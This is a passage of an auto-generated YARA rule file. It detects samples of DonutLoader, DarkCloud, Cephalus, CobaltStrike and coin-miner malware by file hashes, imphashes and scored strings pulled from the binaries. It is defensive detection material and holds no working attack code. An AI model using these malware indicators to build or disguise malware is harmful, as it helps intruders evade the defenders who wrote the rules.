      $s10 = "spYT0tK8gc" fullword ascii /* score: '9.00'*/
      $s11 = "AbQNQnqeyERSyig6JM4" fullword ascii /* score: '9.00'*/
      $s12 = "UinJiM5NTGetTOSi75t" fullword ascii /* score: '9.00'*/
      $s13 = "T8GSIrc4OJ8Mrnuf6n1" fullword ascii /* score: '9.00'*/
      $s14 = "pNa2SEuftpLXphjmERR" fullword ascii /* score: '9.00'*/
      $s15 = "SageTZLTZxMkYY3aMOf" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe_DonutLoader_signature__d42595b695fc008ef2c56aabd8_9 {
   meta:
      description = "_subset_batch - from files da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash2 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash3 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "net/http.(*http2clientConnReadLoop).processHeaders" fullword ascii /* score: '23.00'*/
      $s2 = "type:.eq.log.Logger" fullword ascii /* score: '21.00'*/
      $s3 = "vendor/golang.org/x/net/http/httpguts.ValidHostHeader" fullword ascii /* score: '20.00'*/
      $s4 = "crypto/tls.rsaKeyAgreement.processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s5 = "processClientKeyExchange" fullword ascii /* score: '20.00'*/
      $s6 = "crypto/tls.(*rsaKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s7 = "processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s8 = "crypto/tls.(*ecdheKeyAgreement).processServerKeyExchange" fullword ascii /* score: '20.00'*/
      $s9 = "crypto/x509.SystemRootsError.Error" fullword ascii /* score: '19.00'*/
      $s10 = "p*func(*tls.Config, *tls.clientHelloMsg, *tls.serverHelloMsg, *x509.Certificate, *tls.serverKeyExchangeMsg) error" fullword ascii /* score: '19.00'*/
      $s11 = "net/http.(*http2Framer).logWrite" fullword ascii /* score: '19.00'*/
      $s12 = "net/http.(*http2Transport).logf.Printf.func1" fullword ascii /* score: '19.00'*/
      $s13 = "net/http.(*http2Framer).logWrite.http2NewFramer.func1" fullword ascii /* score: '19.00'*/
      $s14 = "f*func(*tls.Config, *tls.clientHelloMsg, *x509.Certificate) ([]uint8, *tls.clientKeyExchangeMsg, error)" fullword ascii /* score: '19.00'*/
      $s15 = "net/http.(*http2Framer).logWrite.http2NewFramer.func2" fullword ascii /* score: '19.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _CoinMiner_signature__f679c9921ced258c8c53e47b7380bc07_imphash__DonutLoader_signature__5ae8155a26d6fc33fa0ccb0a04458b1f_imph_10 {
   meta:
      description = "_subset_batch - from files CoinMiner(signature)_f679c9921ced258c8c53e47b7380bc07(imphash).exe, DonutLoader(signature)_5ae8155a26d6fc33fa0ccb0a04458b1f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "7215b48548bba5e5502aa68bb83c51c3fdbb30978e7cd2f5b44898886218d085"
      hash2 = "6b165bf2642aa153d783813e82455e10e110711ca3724f6adfdaa190568601b1"
   strings:
      $x1 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x2 = "System.ComponentModel.Design.IRootDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x3 = "System.Windows.Forms.Design.ComponentDocumentDesigner, System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f1" ascii /* score: '34.00'*/
      $x4 = "System.ComponentModel.ComponentConverter, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '34.00'*/
      $x5 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" fullword wide /* score: '34.00'*/
      $x6 = "JSystem.Private.StackTraceMetadata.dll2System.Private.TypeLoader" fullword ascii /* score: '31.00'*/
      $x7 = "NSystem.Private.Reflection.Execution.dllBSystem.Private.StackTraceMetadata" fullword ascii /* score: '31.00'*/
      $s8 = "NSystem.ComponentModel.TypeConverter.dll" fullword ascii /* score: '29.00'*/
      $s9 = "HSystem.ComponentModel.Primitives.dll$System.ObjectModel" fullword ascii /* score: '25.00'*/
      $s10 = "The current thread attempted to reacquire a mutex that has reached its maximum acquire count" fullword wide /* score: '25.00'*/
      $s11 = "System.Collections.Generic.IEnumerable<System.Runtime.Loader.LibraryNameVariation>.GetEnumerator@" fullword ascii /* score: '24.00'*/
      $s12 = "BTryEnsureSufficientExecutionStack.GetSufficientStackLimit" fullword ascii /* score: '24.00'*/
      $s13 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s14 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericTypeEntry>.get_Current@" fullword ascii /* score: '24.00'*/
      $s15 = "System.Collections.Generic.IEnumerator<Internal.Runtime.TypeLoader.TypeLoaderEnvironment.GenericMethodEntry>.get_Current@" fullword ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _b3140404cfaaad7a7b40311b8b81be81_imphash__ca9b1a39503792da1c4d11741d205b38_imphash__e51edaffc92e0c16edc94bfa957b4f42_imphas_11 {
   meta:
      description = "_subset_batch - from files b3140404cfaaad7a7b40311b8b81be81(imphash).exe, ca9b1a39503792da1c4d11741d205b38(imphash).exe, e51edaffc92e0c16edc94bfa957b4f42(imphash).exe, e51edaffc92e0c16edc94bfa957b4f42(imphash)_2528966f.exe, e51edaffc92e0c16edc94bfa957b4f42(imphash)_4aa1f9fa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6246291bb246b9848908a0d23569d4f1ca0b3786d428d8f0b734c3bc27a02d24"
      hash2 = "ba160a62755295ba6e21d3d4b0188ed8913497271b9af9891709a2d2840ad1e5"
      hash3 = "256bf3b4643382351881da45ecf5769c1e84838935f98b526ecb5bac3eb997e9"
      hash4 = "2528966f9b7aea294869d181c104085eda3170b514d8d92f75b2d0cefa3c2bfa"
      hash5 = "4aa1f9fa9a51caa4513114a6d215fdcef787f5ec569dc1bfa526fd4026a394a3"
   strings:
      $s1 = "schannel: Failed to import cert file %s, password is bad" fullword ascii /* score: '23.50'*/
      $s2 = "SEC_E_ILLEGAL_MESSAGE (0x%08X) - This error usually occurs when a fatal SSL/TLS alert is received (e.g. handshake failed). More " ascii /* score: '23.00'*/
      $s3 = "Failed reading the chunked-encoded stream" fullword ascii /* score: '22.00'*/
      $s4 = "Negotiate: noauthpersist -> %d, header part: %s" fullword ascii /* score: '21.50'*/
      $s5 = "failed to load WS2_32.DLL (%u)" fullword ascii /* score: '19.00'*/
      $s6 = "schannel: CertGetNameString() failed to match connection hostname (%s) against server certificate names" fullword ascii /* score: '19.00'*/
      $s7 = "LOGINDISL" fullword ascii /* score: '17.50'*/
      $s8 = "No more connections allowed to host %s: %zu" fullword ascii /* score: '17.50'*/
      $s9 = "RESOLVE %s:%d is - old addresses discarded!" fullword ascii /* score: '16.50'*/
      $s10 = "struct PS_INPUT            {            float4 pos : SV_POSITION;            float4 col : COLOR0;            float2 uv  : TEXCOO" ascii /* score: '16.00'*/
      $s11 = "Content-Type: %s%s%s" fullword ascii /* score: '16.00'*/
      $s12 = "Content-Disposition: %s%s%s%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s13 = "Excess found in a read: excess = %zu, size = %I64d, maxdownload = %I64d, bytecount = %I64d" fullword ascii /* score: '16.00'*/
      $s14 = ") : SV_Target            {            float4 out_col = input.col * texture0.Sample(sampler0, input.uv);             return out_c" ascii /* score: '16.00'*/
      $s15 = "SOCKS4%s: connecting to HTTP proxy %s port %d" fullword ascii /* score: '15.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DarkCloud_signature__1895460fffad9475fda0c84755ecfee1_imphash__DarkCloud_signature__1895460fffad9475fda0c84755ecfee1_imphas_12 {
   meta:
      description = "_subset_batch - from files DarkCloud(signature)_1895460fffad9475fda0c84755ecfee1(imphash).exe, DarkCloud(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_34d0574c.exe, DarkCloud(signature)_1895460fffad9475fda0c84755ecfee1(imphash)_5fe2cc4e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cd37c70f73432edc09ba5eaddc861f58ba8574febbe4d5744b5c743631ce0165"
      hash2 = "34d0574ceed1af5e128a0f222fdea38a9d4aad4cecea5f40e0b9c1152f8b177d"
      hash3 = "5fe2cc4e418bd8819c9fc1aca0f97baccc83ce7f247d70c6cc902339adbd2b94"
   strings:
      $s1 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" language=\"*\" processorArchitec" ascii /* score: '26.00'*/
      $s2 = "/AutoIt3ExecuteScript" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s3 = "/AutoIt3ExecuteLine" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s4 = "PROCESSGETSTATS" fullword wide /* score: '22.50'*/
      $s5 = "WINGETPROCESS" fullword wide /* score: '22.50'*/
      $s6 = "SCRIPTNAME" fullword wide /* base64 encoded string*/ /* score: '22.50'*/
      $s7 = "SHELLEXECUTEWAIT" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s8 = "SHELLEXECUTE" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.50'*/
      $s9 = "*Unable to get a list of running processes." fullword wide /* score: '20.00'*/
      $s10 = "PROCESSSETPRIORITY" fullword wide /* score: '17.50'*/
      $s11 = "HTTPSETUSERAGENT" fullword wide /* score: '17.50'*/
      $s12 = "PROCESSWAITCLOSE" fullword wide /* score: '17.50'*/
      $s13 = "PROCESSEXISTS" fullword wide /* score: '17.50'*/
      $s14 = "PROCESSCLOSE" fullword wide /* score: '17.50'*/
      $s15 = "PROCESSWAIT" fullword wide /* score: '17.50'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "0b768923437678ce375719e30b21693e" and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_Cephalus_signature__d42595b695_13 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe, Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, CobaltStrike(signature)_f0ea7b7844bbc5bfa9bb32efdcea957c(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf, f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4_f2bbba1e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
      hash3 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash4 = "da2e0c0fcb8accb823745b294de378f99bcfa6fc9856ee21f1ad46bceef1f0ec"
      hash5 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash6 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash7 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash8 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
      hash9 = "f2bbba1ea0f34b262f158ff31e00d39d89bbc471d04e8fca60a034cabe18e4f4"
   strings:
      $s1 = "runtime.getempty.func1" fullword ascii /* score: '22.00'*/
      $s2 = "runtime.getempty" fullword ascii /* score: '22.00'*/
      $s3 = "runtime.execute" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.tracebackHexdump" fullword ascii /* score: '20.00'*/
      $s5 = "runtime.dumpregs" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.gcDumpObject" fullword ascii /* score: '20.00'*/
      $s7 = "runtime.tracebackHexdump.func1" fullword ascii /* score: '20.00'*/
      $s8 = "runtime.dumpgstatus" fullword ascii /* score: '20.00'*/
      $s9 = "runtime.injectglist.func1" fullword ascii /* score: '20.00'*/
      $s10 = "runtime.injectglist" fullword ascii /* score: '20.00'*/
      $s11 = "runtime.hexdumpWords" fullword ascii /* score: '20.00'*/
      $s12 = "runtime.(*rwmutex).rlock" fullword ascii /* score: '18.00'*/
      $s13 = "*runtime.mutex" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.envKeyEqual" fullword ascii /* score: '18.00'*/
      $s15 = "runtime.(*rwmutex).runlock" fullword ascii /* score: '18.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and ( 8 of them )
      ) or ( all of them )
}

rule _c7269d59926fa4252270f407e4dab043_imphash__c7269d59926fa4252270f407e4dab043_imphash__f234f9b7_14 {
   meta:
      description = "_subset_batch - from files c7269d59926fa4252270f407e4dab043(imphash).exe, c7269d59926fa4252270f407e4dab043(imphash)_f234f9b7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c5a823ae5350380c8193063b4d5f01e338b82481f19ddd106d0b3d06058476b"
      hash2 = "f234f9b798ad23cb4bafca43e166a651ae2bb52bd7df8b004ebb163f0a87cbfd"
   strings:
      $x1 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '58.00'*/
      $x2 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '54.00'*/
      $x3 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x4 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock,  nBSSRoot" ascii /* score: '47.00'*/
      $x5 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryUnable to determine " ascii /* score: '47.00'*/
      $x6 = "object is remotepacer: H_m_prev=reflect mismatchremote I/O errorruntime:  g:  g=runtime: addr = runtime: base = runtime: gp: gp=" ascii /* score: '46.00'*/
      $x7 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '44.50'*/
      $x8 = "152587890625762939453125Bidi_ControlErrUnknownPCGetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWJoin_Con" ascii /* score: '44.00'*/
      $x9 = "lock: lock countslice bounds out of rangesocket type not supportedstartm: p has runnable gsstoplockedm: not runnableunexpected f" ascii /* score: '44.00'*/
      $x10 = " to non-Go memory , locked to thread298023223876953125Arab Standard TimeCaucasian_AlbanianCommandLineToArgvWCreateFileMappingWCu" ascii /* score: '42.00'*/
      $x11 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '35.00'*/
      $x12 = "collectionidentifier removedindex out of rangeinput/output errormultihop attemptedno child processesno locks availableoperation " ascii /* score: '33.00'*/
      $x13 = "rmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexinvalid bit size locked m0 woke upmark - bad statu" ascii /* score: '33.00'*/
      $x14 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dlllfstack.pushmadvdontneedmheapSpe" ascii /* score: '33.00'*/
      $x15 = "476837158203125<invalid Value>ASCII_Hex_DigitCreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushVie" ascii /* score: '32.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "c7269d59926fa4252270f407e4dab043" and ( 1 of ($x*) )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__d42595b695fc008ef2c56aabd8efd68e_imphash__691c1d6c_da06a1fea0_15 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, d42595b695fc008ef2c56aabd8efd68e(imphash)_691c1d6c.exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "691c1d6c02c0153bdfaf6fb31506cd3aced24ed9902747c39fa6ac2094c202f1"
      hash3 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash4 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash5 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "sync/atomic.(*Pointer[go.shape.struct { internal/bisect.recent [128][4]uint64; internal/bisect.mu sync.Mutex; internal/bisect.m " ascii /* score: '22.00'*/
      $s2 = "runtime.totalMutexWaitTimeNanos" fullword ascii /* score: '21.00'*/
      $s3 = "runtime.mapKeyError" fullword ascii /* score: '21.00'*/
      $s4 = "runtime.mapKeyError2" fullword ascii /* score: '21.00'*/
      $s5 = "runtime.dumpStacksRec" fullword ascii /* score: '20.00'*/
      $s6 = "runtime.dumpTypesRec" fullword ascii /* score: '20.00'*/
      $s7 = "internal/runtime/atomic.(*Pointer[go.shape.struct { runtime.heap bool; runtime.rangefunc bool; runtime.sp uintptr; runtime.pc ui" ascii /* score: '19.00'*/
      $s8 = "ntptr; runtime.fn func(); runtime.link *runtime._defer; runtime.head *internal/runtime/atomic.Pointer[runtime._defer] }]).Compar" ascii /* score: '19.00'*/
      $s9 = "dressmspan.sweep: bad span stateinvalid profile bucket typeruntime: corrupted polldescruntime: netpollinit failedruntime: asyncP" ascii /* score: '18.00'*/
      $s10 = "internal/sync.runtime_SemacquireMutex" fullword ascii /* score: '18.00'*/
      $s11 = "targetpc" fullword ascii /* score: '18.00'*/
      $s12 = "internal/runtime/maps.mapKeyError" fullword ascii /* score: '18.00'*/
      $s13 = "runtime.(*rwmutex).init" fullword ascii /* score: '18.00'*/
      $s14 = "runtime.compute0" fullword ascii /* score: '17.00'*/
      $s15 = "runtime.metricReader.compute-fm" fullword ascii /* score: '17.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _DarkCloud_signature__0af14e390aa0c2e1d5c3a65fe04db71f_imphash__DarkCloud_signature__257b6ad172355621a748811da87faeae_imphas_16 {
   meta:
      description = "_subset_batch - from files DarkCloud(signature)_0af14e390aa0c2e1d5c3a65fe04db71f(imphash).exe, DarkCloud(signature)_257b6ad172355621a748811da87faeae(imphash).exe, DarkCloud(signature)_3d3e8a0d7038434ba8990776a4c532a8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a5c842231fc7f90c04fc2b55ec1580159e51667907cc29d3f9f88aa2cf541f22"
      hash2 = "092019759df2942f4512441a3ff1c8012fd3552a091cd68083b82457f3a04100"
      hash3 = "77a3d2a1053ab13bf2f8b3bb56862cdc27dac9606ec34045d88beb7e2b13b61f"
   strings:
      $s1 = "C:\\Windows\\System32\\taskmgr.exe" fullword wide /* score: '29.00'*/
      $s2 = "C:\\Windows\\SysWOW64\\msvbvm60.dll\\3" fullword ascii /* score: '22.00'*/
      $s3 = "e32.dll" fullword ascii /* score: '20.00'*/
      $s4 = "tl32.dll" fullword ascii /* score: '20.00'*/
      $s5 = "Password set for Process Information. Enter Password to continue" fullword wide /* score: '18.00'*/
      $s6 = "Password set for Process Information" fullword wide /* score: '18.00'*/
      $s7 = "VB@A6.DLL" fullword ascii /* score: '17.00'*/
      $s8 = "Process Control Center" fullword wide /* score: '17.00'*/
      $s9 = "[Process Name]" fullword ascii /* score: '15.00'*/
      $s10 = "Rename Hacked Process To:" fullword ascii /* score: '15.00'*/
      $s11 = "Process Will be blocked in:" fullword ascii /* score: '15.00'*/
      $s12 = "frmProcessHack" fullword ascii /* score: '15.00'*/
      $s13 = "Process Home" fullword wide /* score: '15.00'*/
      $s14 = "Process Gateway" fullword wide /* score: '15.00'*/
      $s15 = "ProcessHack" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 16000KB and ( 8 of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__09cf66e4_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__466f9e24_17 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_09cf66e4.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_466f9e24.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "09cf66e4d2d730eba1dfdc37c074fc193aa81ff6f98fbd036b062492caa8561c"
      hash2 = "466f9e244b4da580581cc837fbb9f75513386227839932ed8f331c8c9979f8e1"
   strings:
      $s1 = "System.Net.HostHeaderString" fullword ascii /* score: '23.00'*/
      $s2 = "System.Net.DownloadDataCompletedEventArgs" fullword ascii /* score: '22.00'*/
      $s3 = "System.CodeDom.Compiler.HandlerBase" fullword ascii /* score: '22.00'*/
      $s4 = "System.Xml.ReadContentAsBinaryHelper+<ReadContentAsBase64Async>d__27" fullword ascii /* score: '21.00'*/
      $s5 = "System.Xml.ReadContentAsBinaryHelper+State" fullword ascii /* score: '21.00'*/
      $s6 = "System.Runtime.InteropServices.ComEventsInfo" fullword ascii /* score: '20.00'*/
      $s7 = "System.Runtime.InteropServices.ComTypes.IEnumVARIANT" fullword ascii /* score: '20.00'*/
      $s8 = "System.Runtime.CompilerServices.AsyncMethodBuilderCore+MoveNextRunner" fullword ascii /* score: '20.00'*/
      $s9 = "System.Runtime.InteropServices.ComTypes.ITypeLib" fullword ascii /* score: '20.00'*/
      $s10 = "System.Runtime.CompilerServices.DisablePrivateReflectionAttribute" fullword ascii /* score: '20.00'*/
      $s11 = "System.ComponentModel.ListSortDescriptionCollection" fullword ascii /* score: '20.00'*/
      $s12 = "System.Net.HttpListenerRequest+SslStatus" fullword ascii /* score: '19.00'*/
      $s13 = "System.Net.HttpListener+State" fullword ascii /* score: '19.00'*/
      $s14 = "System.Runtime.InteropServices.WindowsRuntime.ICustomPropertyProviderProxy`2+IVectorViewToIBindableVectorViewAdapter`1" fullword ascii /* score: '19.00'*/
      $s15 = "System.Threading.ExecutionContext+CaptureOptions" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 400KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _ca9b1a39503792da1c4d11741d205b38_imphash__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__2a05603f_18 {
   meta:
      description = "_subset_batch - from files ca9b1a39503792da1c4d11741d205b38(imphash).exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2a05603f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ba160a62755295ba6e21d3d4b0188ed8913497271b9af9891709a2d2840ad1e5"
      hash2 = "2a05603fd3adbd7c74e32248e6da4e52dc8fc1412910c0f473261996ad4f8652"
   strings:
      $s1 = "vscript" fullword ascii /* score: '14.00'*/
      $s2 = "pipedbl" fullword ascii /* score: '14.00'*/
      $s3 = "ascriptturn" fullword ascii /* score: '14.00'*/
      $s4 = "pipedblbar" fullword ascii /* score: '14.00'*/
      $s5 = "epsilonclosed" fullword ascii /* score: '11.00'*/
      $s6 = "omegaclosed" fullword ascii /* score: '11.00'*/
      $s7 = "addresssubject" fullword ascii /* score: '11.00'*/
      $s8 = "ascript_uni02DE" fullword ascii /* score: '10.00'*/
      $s9 = "\"&554632" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UF2' */
      $s10 = "4&'&&54632" fullword ascii /* score: '9.00'*/ /* hex encoded string 'EF2' */
      $s11 = "\"&55!&&#\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'U' */
      $s12 = "#\"&55!&&#\"" fullword ascii /* score: '9.00'*/ /* hex encoded string 'U' */
      $s13 = "lambdabar" fullword ascii /* score: '8.00'*/
      $s14 = "gcursive" fullword ascii /* score: '8.00'*/
      $s15 = "hyphendot" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Cephalus_signature__d42595b695fc008ef2c56aabd8efd68e_imphash__da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb2_19 {
   meta:
      description = "_subset_batch - from files Cephalus(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5_da06a1fe.elf, DonutLoader(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe, e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b_e689afee.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a34acd47127196ab867d572c2c6cf2fcccffa3a7a87e82d338a8efed898ca722"
      hash2 = "da06a1fea03a65303b4dd9e7cc4337a127ad450d07bb7939de6c2e27a0cb23b5"
      hash3 = "93a76dcb046672ce458a272400fdc8040942c1dd8605ed7b81bc98fcca3b5e1b"
      hash4 = "e689afee5f7bdbd1613bd9a3915ef2a185a05c72aaae4df3dee988fa7109cb0b"
   strings:
      $s1 = "sync/atomic.(*Pointer[go.shape.struct { math/rand.src math/rand.Source; math/rand.s64 math/rand.Source64; math/rand.readVal int6" ascii /* score: '17.00'*/
      $s2 = "runtime.getStaticuint64s" fullword ascii /* score: '15.00'*/
      $s3 = "cmp.Compare[go.shape.float64]" fullword ascii /* score: '14.00'*/
      $s4 = "4; math/rand.readPos int8 }]).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s5 = "cmp.Compare[go.shape.uint64]" fullword ascii /* score: '14.00'*/
      $s6 = "cmp.Compare[go.shape.uintptr]" fullword ascii /* score: '14.00'*/
      $s7 = "time.commaOrPeriod" fullword ascii /* score: '14.00'*/
      $s8 = "cmp.Compare[go.shape.int64]" fullword ascii /* score: '14.00'*/
      $s9 = "strings.Compare" fullword ascii /* score: '14.00'*/
      $s10 = "cmp.Compare[go.shape.string]" fullword ascii /* score: '14.00'*/
      $s11 = "vendor/golang.org/x/crypto/cryptobyte.(*String).ReadASN1ObjectIdentifier" fullword ascii /* score: '13.00'*/
      $s12 = "crypto/internal/fips140/rsa.(*PrivateKey).PublicKey" fullword ascii /* score: '13.00'*/
      $s13 = "internal/runtime/maps.(*Iter).Key" fullword ascii /* score: '13.00'*/
      $s14 = "crypto/internal/fips140/ed25519.(*PrivateKey).PublicKey" fullword ascii /* score: '13.00'*/
      $s15 = "time.getnum" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 24000KB and pe.imphash() == "d42595b695fc008ef2c56aabd8efd68e" and ( 8 of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3b79e53a_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5c69a4e5_21 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3b79e53a.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5c69a4e5.exe"
